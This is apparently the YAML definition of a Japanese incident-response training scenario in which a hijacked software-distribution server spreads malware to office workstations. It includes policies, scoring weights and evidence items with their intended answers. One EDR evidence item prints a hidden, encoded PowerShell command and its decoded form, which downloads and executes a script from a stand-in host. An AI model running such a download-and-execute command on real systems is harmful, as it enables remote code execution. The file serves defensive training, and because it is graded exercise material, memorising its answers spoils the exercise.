schema_version: "0.4"

meta:
  id: software-distribution-spread-01
  title: "配られていく更新"
  version: "1.0.0"
  author: "IR Dojo"
  license: "CC-BY-4.0"
  estimated_play_minutes: 10
  language: ja
  default_policy: spread_containment
  default_assist_level: assisted
  briefing: |
    11:20、監視センターから連絡。設計部の端末 ws-eng01 で、
    難読化されたスクリプトが起動したことを EDR が検知した。
    あなたは情報システム部のインシデント対応担当として呼ばれた。

    拠点の管理対象は 7 台。平日の日中帯で、利用者はそれぞれ席にいる。
    監視センターからの一次情報は「ws-eng01 でスクリプトが走った」のみである。
  tags: [distribution, spread, misleading-evidence]

world:
  assets:
    # `aliases` は置いていない。資料もコマンド行も id で呼んでおり、
    # label から作れる名前で足りている。資料の側で呼び方を増やしたら、
    # ここにも宣言を足すこと（SPEC 5.2 / v1.45）。見ているのは
    # test_every_asset_a_piece_of_evidence_points_at_is_named_in_it
    - id: dist01
      label: "構成管理サーバ"
      criticality: critical
      depends_on: [repo01]
      # 全端末への更新配信と設定適用がここで止まる。
      # 止めると拠点全体の保守作業が丸ごと止まる
      business_impact_per_hour: 60

    - id: repo01
      label: "パッケージ保管庫"
      criticality: high
      depends_on: []
      # 配信の材料置き場。止めると新しい版が作れなくなる
      business_impact_per_hour: 16

    - id: mgmt01
      label: "運用作業端末"
      criticality: medium
      # **dist01 にぶら下げていない。** ぶら下げると、保管庫を止めた
      # だけで無実の資産が2つ巻き込まれ、「無実の資産を止める代価」が
      # 8.3 の帯（0.5〜1.5点）を突き抜ける（実測 2.67点）
      depends_on: []
      # 運用チームの作業台。止めると当日の運用作業が全部止まる
      business_impact_per_hour: 14

    - id: ws-eng01
      label: "設計部端末 (橋本)"
      criticality: medium
      depends_on: []
      # 設計部の検証担当。図面の確認作業が止まる
      business_impact_per_hour: 13

    - id: ws-acct
      label: "経理部端末 (真下)"
      criticality: low
      depends_on: []
      # 支払処理の締切が近い。止めるとその日の支払が止まる
      business_impact_per_hour: 10

    - id: ws-sales
      label: "営業部端末 (小松)"
      criticality: low
      depends_on: []
      # 受注の入力担当。止めると当日分の受注処理が滞る
      business_impact_per_hour: 9

    - id: ws-lobby
      label: "受付の共用端末"
      criticality: low
      depends_on: []
      # 誰の担当でもない共用機。止まるのは来客表示だけ
      business_impact_per_hour: 3

  ground_truth:
    patient_zero: dist01
    # **開始時点の**侵害資産である（SPEC 5.2）。この盤面は演習中に増える
    compromised: [dist01, ws-eng01]
    persistence: [ws-eng01]
    innocent: [repo01, mgmt01, ws-lobby]
    # **この盤面だけが持つもの。** 1本目・2本目の真実は執筆時に固定で、
    # timeline は圧力しか運ばなかった。ここでは、配る仕組みを攻撃者が
    # 握っているので、調べている間も配られ続ける。
    #
    # 配り元（dist01）を止めてあれば、その窓では何も配られない。
    # **学習者の不作為が原因でしか広がらない形にしてある** —
    # 3方針のどれで最良に解いても、dist01 が止まるのは 120分より前で、
    # 最初の窓（240分）までに 120分の余裕がある。
    #
    # repo01 を止めても配信は止まらない。次の版が作れなくなるだけで、
    # 配る分は dist01 の側に既に置かれている。「根を落とせば全部止まる」を
    # この盤面で試すと、業務だけが止まって配信は続く
    spreads:
      - id: sp_ring_sales
        to: ws-sales
        at_minutes: 270
        unless_contained: [dist01]
        reveals: [ev_ring_sales]
      # 2つ目の窓は、**判断を下したあとに開く位置**に置いてある。
      # 判定した時点では正しかった名指しが、止める場所を間違えている間に
      # 古くなる — 事実認識層（判定時点で測る）と封じ込めの完全度
      # （終了時点で測る）が別々の数を見ていることが、ここで初めて読める
      - id: sp_ring_acct
        to: ws-acct
        at_minutes: 380
        unless_contained: [dist01]
        reveals: [ev_ring_acct]
    attack_narrative: |
      4/9 10:41、攻撃者が dist01 の管理コンソールへ、保守用の共有アカウントで
      外部からログインした。この口は多要素認証の対象外に置かれたままで、
      同じ資格情報が委託先との作業手順書に載っていた。

      10:52、攻撃者は配信ジョブの「導入後に走らせる処理」を書き換えた。
      パッケージ本体には一切触れていない。repo01 に置かれた版も、
      その署名も、最初から最後まで正しいままである。攻撃者が触ったのは
      パッケージの外側、dist01 が持っているジョブの定義だけだった。

      11:05、ring-1（検証）へ配信が走り、ws-eng01 に入った。
      11:12、導入後処理として難読化スクリプトが起動し、
      11:13 に常駐タスクが登録され、11:16 から外部へ接続を始めた。
      ws-eng01 は端末を再起動しても同じところへ戻る状態にある。

      配信計画は ring-1 の後に ring-2（営業）13:50、ring-3（経理）16:20 と
      続く。dist01 を止めない限り、この2つの窓は予定どおり開く。
      演習中に ws-sales と ws-acct が侵害されるとしたら、それは
      攻撃者が新たに動いたからではなく、配る仕組みが動き続けたからである。

      11:00 に ws-lobby と ws-eng01 が同じ形の通信を同時に出しているのは、
      配布エージェントが毎正時に dist01 へ問い合わせる標準の動作による。
      全端末が同じ時刻に同じ宛先へ話す。2台が同じ挙動をしていたのは、
      片方がもう片方を叩いたからではなく、同じ仕組みがそうさせたからである。
      ws-lobby は攻撃とは無関係。

      10:35 に mgmt01 から dist01 へ集中していた特権操作は、
      承認済みの定例メンテナンス (CHG-2026-0412) である。攻撃とは無関係。

policies:
  - id: business_continuity
    label: "業務継続最優先"
    briefing: |
      経営判断により、拠点の基幹サービスの停止は最終手段とする。
      封じ込めは業務影響を最小化する形で実施すること。
      証拠保全は可能な範囲で行えばよい。

      基幹資産（dist01 / repo01）を止める場合は、
      その資産が侵害されている根拠を示せる状態であること。

      全社へ一斉に手を止めさせる連絡は出さないこと。
    weights:
      business_impact:          0.40
      total_damage:             0.25
      containment_completeness: 0.25
      evidence_preserved:       0.10
    constraints:
      - type: forbid_containment_without_evidence
        assets: [dist01, repo01]
        message: "証拠なしに基幹資産を停止することは方針違反です"
      # 全社に「今の状態を変えるな」と流すことは、その日の作業を
      # 止めることと同じである。証拠は残るが、仕事は止まる
      - type: forbid_action
        action_ids: [act_hold_notice]
        message: "全社への現状維持の周知は、その日の業務を止めます"

  - id: evidence_preservation
    label: "証拠保全最優先"
    briefing: |
      委託先との契約上、経緯の説明責任があり、証拠保全を最優先とする。
      揮発性証拠の確保を封じ込めに先行させること。

      止める資産ごとに、その資産から稼働中の状態を取ってから止めること。
      別の資産で取れていることは、この要件を満たさない。

      配信を外から塞ぐだけにしないこと。塞いでも中の処理は回り続け、
      記録は上書きされ続ける。電源も落とさないこと。
      端末を作り直すのも、その端末に残っているものごと消す行為である。
    # 名乗りの順序と重みの順序を一致させる（SPEC 5.3）。この方針は
    # ブリーフィングで業務継続について何も約束していないので、
    # 業務影響は最も軽い。**重みを下げた分は完全度へ回す** —
    # 実測で「何も止めないプレイ」が最良の組に 9点差まで迫っており、
    # 保全だけを見る方針は「何もしない」を褒めかねない
    weights:
      evidence_preserved:       0.50
      containment_completeness: 0.30
      total_damage:             0.15
      business_impact:          0.05
    constraints:
      # `require_before` ではこの方針は成立しない（v1.40）。
      # 盤面のどこか1つで揮発性を取れば済むので、dist01 を無条件に
      # 落とせるようになり、業務継続最優先の複製になる
      - type: require_capture_of_target
        action_type: contain
        prerequisite_tags: [volatile_capture]
        message: "止める資産の稼働中の状態を、止める前に取っていません"
      - type: forbid_action
        action_ids: [act_block_dist_edge, act_shutdown_dist01, act_rebuild_eng01]
        message: "外から塞ぐだけにも、電源を落としても、作り直してもいけません"

  - id: spread_containment
    label: "拡散阻止最優先"
    briefing: |
      これ以上配られることの阻止を最優先とする。
      業務影響および証拠保全は二次的な考慮事項とする。

      止めるべきものは、根拠が固まる前でも止めてよい。
      半端な塞ぎ方で凌がず、配る側そのものを確実に落とすこと。
      端末に残っているものも、登録を戻すだけで済ませないこと。
    weights:
      total_damage:             0.50
      containment_completeness: 0.30
      business_impact:          0.10
      evidence_preserved:       0.10
    constraints:
      # 境界で塞いでも内側の配信経路は残り、サービスを止めても
      # ジョブの定義と資格情報はそのまま残る。どちらもこの方針では
      # 「半端な塞ぎ方」にあたる（ブリーフィングの地の文が根拠）
      - type: forbid_action
        action_ids: [act_block_dist_edge, act_stop_dist_service]
        message: "外から塞いでも、サービスを止めても、配る側は生きています"
      # 登録を戻すだけの除去は、見えていない場所に残った分を取りこぼしうる。
      # 丁寧なほうが高くつくのは dist01 の3手と同じ形で、
      # この方針だけが「安くて確実なほう」を選ばされる
      - type: forbid_action
        action_ids: [act_purge_eng01]
        message: "登録を戻すだけでは取りこぼしうる。この方針では作り直すこと"

evidence:
  - id: ev_eng_child
    points_to: [ws-eng01]
    misleading: false
    plausibility: high
    volatile: false
    occurred_at: "2026-04-09 11:12"
    summary: "ws-eng01 で、配布エージェントの子として難読化スクリプトが起動している"
    reading: |
      EDR の検知詳細。ProcessTree は、検知した実行体から親をたどった並びである。
      いちばん下が検知対象で、上へ行くほど先に起動したものを指す。

      コマンドラインの各オプション:
        -nop   プロファイルスクリプトを読み込まない
        -w hidden  ウィンドウを表示しない
        -enc   続く文字列が Base64 (UTF-16LE) であることを示す

      SQBOAFYA... をデコードすると次になる:
        INVOKE-EXPRESSION (IWR -UseB 'http://203.0.113.24/u.txt')

      IWR は Invoke-WebRequest の別名で、-UseB は UseBasicParsing の略。
      取得した文字列をその場で実行する形である。

      Integrity は実行時の権限水準を指す。System は最も高い水準で、
      サービスとして動いているものがこの水準を持つ。
    possibilities:
      - |-
        配る仕組みが、手順に書かれたとおりの処理を走らせた。
        その手順に何が書かれていたかで分かれる
      - |-
        利用者が受け取った案内を、自分の手で貼り付けて動かした。
        本人がその時刻に何をしたかで分かれる
      - |-
        以前から入っていたものが、この時刻にたまたま動いた。
        いつ入ったものなのかを見れば分かれる
    content: |
      # EDR 検知詳細 / alert-2026-0409-0037

      Host        : WS-ENG01.corp.local
      DetectedAt  : 2026-04-09T11:12:41+09:00
      Severity    : High
      Rule        : Obfuscated script execution

      ProcessTree :
        C:\Program Files\CfgAgent\cfgagentsvc.exe   (Integrity: System)
          C:\Windows\System32\cmd.exe  /c ".\post-install.cmd"
            C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
              -nop -w hidden -enc SQBOAFYATwBLAEUALQBFAFgAUABSAEUAUwBTAEkA
              TwBOACAAKABJAFcAUgAgAC0AVQBzAGUAQgAgACcAaAB0AHQAcAA6AC8ALwAy
              ADAAMwAuADAALgAxADEAMwAuADIANAAvAHUALgB0AHgAdAAnACkA

      収集範囲 : EDR が保持している実行イベント（検知前後 30分）
      非対象   : 端末のローカルにしか残らない記録、EDR 導入前の実行

  # **共通原因型の誤導**（SPEC 3.4 の型の表）。2台が同じ時刻に同じ形の
  # 通信を出しているので、片方がもう片方を叩いたように読める。
  # 実際には、同じ仕組みが両方にそうさせているだけである。
  # この型は1本目・2本目には無い（1本目は時刻の近さと向きの取り違え、
  # 2本目は利用実績の比較）。棄却できるのは、その仕組みの標準動作を
  # 知るか、もう一方の端末を見に行くかのどちらかである
  - id: ev_agent_beacon
    points_to: [ws-lobby]
    misleading: true
    plausibility: high
    volatile: false
    occurred_at: "2026-04-09 11:00"
    refuted_by: [ev_agent_policy, ev_lobby_live]
    summary: "ws-lobby と ws-eng01 が 11:00 に、同じ宛先へ同じ形の通信を出している"
    reading: |
      フロー情報の各列は「時刻 送信元 → 宛先:ポート バイト数 継続時間 ja3」。

      ja3 は TLS のクライアント側の挨拶の仕方を並べて要約した指紋である。
      同じソフトウェアの同じ版なら、どの端末から出ても同じ値になる。
      逆に言うと、値が同じことが分かるのは「同じものが話している」までで、
      どちらが先に話しかけたかは、この指紋からは出てこない。

      bytes_out が三桁の通信は、中身のあるやり取りではなく、
      問い合わせと短い応答の往復であることが多い。

      192.0.2.0/24 は拠点内のアドレス帯である。
    possibilities:
      - |-
        同じ仕組みが両方に入っていて、揃った時刻に外へ出た。
        その仕組みの決まった動きを見れば分かれる
      - |-
        片方に入ったものが、もう片方へ同じものを送り込んだ。
        送り込んだ側の記録が残っているかで分かれる
      - |-
        たまたま同じ時刻に、別々の理由で外へ出ただけだった。
        それぞれの端末の側で何が動いたかで分かれる
    content: |
      # コアスイッチのフロー情報 / 2026-04-09 10:00-11:20

      11:00:02  192.0.2.61 (WS-LOBBY) → 192.0.2.10:8443  bytes_out=412  dur=0.9s  ja3=51c64c77e6
      11:00:02  192.0.2.44 (WS-ENG01) → 192.0.2.10:8443  bytes_out=412  dur=0.8s  ja3=51c64c77e6
      11:00:03  192.0.2.52 (WS-ACCT)  → 192.0.2.10:8443  bytes_out=412  dur=1.1s  ja3=51c64c77e6
      10:00:02  192.0.2.61 (WS-LOBBY) → 192.0.2.10:8443  bytes_out=412  dur=0.9s  ja3=51c64c77e6
      10:00:01  192.0.2.44 (WS-ENG01) → 192.0.2.10:8443  bytes_out=412  dur=0.8s  ja3=51c64c77e6

      集計対象 : コアスイッチと境界を通過したフロー
      非対象   : 同一セグメント内で完結し、コアを通らない通信

  - id: ev_agent_policy
    points_to: []
    misleading: false
    plausibility: medium
    volatile: false
    summary: "配布エージェントは全端末共通で、毎正時に配信元へ問い合わせる設定である"
    reading: |
      配布製品の運用手順書と、配られている共通設定の抜粋である。

      PollInterval は問い合わせの間隔、PollAnchor はその起点を指す。
      起点を正時に固定する設定では、全端末の問い合わせが同じ分に揃う。
      間隔だけを決めて起点を決めない設定なら、端末ごとに時刻がばらける。

      Ring は段階配信の区分で、どの端末がどの順番で受け取るかを表す。
      同じ Ring の端末は同じ配信を同じ窓で受け取る。

      手順書が書いているのは、この拠点でそう決めてあるという事実である。
      当日そのとおりに動いたかどうかは、通信の側の記録に残る。
    possibilities:
      - |-
        決めたとおりに、今も全端末で同じ動きをしている。
        当日の通信が設定と合っているかで分かれる
      - |-
        設定は残っているが、動いている間隔はそれと違う。
        端末側に入っている版と設定で分かれる
      - |-
        決めた動きに、別の何かが重なって出ている。
        宛先と量が決めた枠に収まるかで分かれる
    content: |
      # 構成管理運用手順書 (rev.7) / 共通設定 cfgagent.policy より抜粋

      [Agent]
      PollInterval  = 3600          ; 秒
      PollAnchor    = top-of-hour   ; 起点を正時に固定
      Endpoint      = 192.0.2.10:8443
      Transport     = TLS 1.3
      Payload       = 問い合わせ 412 bytes 固定

      [Rings]
      ring-1 = 検証     (1 台)
      ring-2 = 営業     (1 台)
      ring-3 = 経理     (1 台)
      ring-4 = 共用・予備 (1 台)

      照会対象 : 配布製品の手順書と、配られている共通設定
      非対象   : 各端末が実際にその設定で動いているかどうか

  - id: ev_change_ticket
    points_to: []
    misleading: false
    plausibility: medium
    volatile: false
    summary: "当日午前に、承認済みの定例メンテナンス作業が1件登録されている"
    reading: |
      変更管理台帳の1件分である。読む順は 種別 → 実施時間帯 → 実施者 → 対象。

      「実施時間帯」は申請された枠であって、実際に手を動かした時刻とは
      ずれることがある。作業記録の側に開始と終了が残るので、
      台帳と突き合わせて読む。

      「作業内容」に書かれた手順のうち、権限の昇格を伴うものがどれかは
      手順書の側にある。台帳が書いているのは、その作業が承認されていた
      という事実であって、その時間帯に起きたことの全部ではない。

      承認者と実施者が別人であることは、この組織の通常の運用である。
    possibilities:
      - |-
        申請どおりの作業が、申請どおりの時間帯に行われた。
        作業記録の開始と終了が枠に収まるかで分かれる
      - |-
        申請は出ているが、当日は行われずに流れた。
        実施の記録が残っているかどうかで分かれる
      - |-
        申請された作業と別の動きが、同じ枠に重なっている。
        操作の中身が手順のどれに当たるかで分かれる
    content: |
      # 変更管理台帳 / 2026-04-09 分

      CHG-2026-0412
        種別       : 定例メンテナンス（月次）
